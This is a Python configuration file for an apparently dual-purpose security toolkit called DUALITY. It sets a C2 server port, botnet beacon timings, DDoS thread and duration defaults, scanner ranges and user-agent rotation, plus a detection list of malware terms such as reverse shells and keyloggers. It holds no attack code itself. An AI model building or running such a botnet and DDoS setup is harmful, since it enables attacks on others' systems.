#!/usr/bin/env python3
# Configuration settings

import os

# Directories
HOME = os.path.expanduser("~")
APP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_DIR = f"{HOME}/.duality"
PAYLOAD_DIR = f"{DATA_DIR}/payloads"
LOG_DIR = f"{DATA_DIR}/logs"
OSINT_DIR = f"{DATA_DIR}/osint"
SCAN_DIR = f"{DATA_DIR}/scans"
BACKUP_DIR = f"{DATA_DIR}/backups"
QUARANTINE_DIR = f"{DATA_DIR}/quarantine"

# Create directories
for d in [DATA_DIR, PAYLOAD_DIR, LOG_DIR, OSINT_DIR, SCAN_DIR, BACKUP_DIR, QUARANTINE_DIR]:
    os.makedirs(d, exist_ok=True)

# Network settings
C2_PORT = 5000
C2_HOST = "0.0.0.0"

# Botnet settings
BEACON_INTERVAL = 10
HEARTBEAT_TIMEOUT = 30

# DDoS settings
DEFAULT_THREADS = 100
DEFAULT_DURATION = 60

# Scanner settings
DEFAULT_PORTS = "1-1000"
SCAN_TIMEOUT = 0.5

# API endpoints
IP_API = "http://ip-api.com/json"
PHONE_API = "http://apilayer.net/api/validate"

# File extensions
PROTECTED_EXTS = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png', '.py', '.sh']
MALWARE_EXTS = ['.exe', '.bat', '.ps1', '.vbs', '.scr']

# Suspicious patterns
SUSPICIOUS_PATTERNS = [
    'reverse_shell', 'keylogger', 'ransomware', 'worm',
    'backdoor', 'trojan', 'exploit', 'payload',
    'socket.connect', 'subprocess.call', 'os.system'
]

# User agent list
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
]

# Version
VERSION = "3.0.0"
AUTHOR = "Architect 02"
REPO = "https://github.com/zethkaretjir-del/DUALITY"
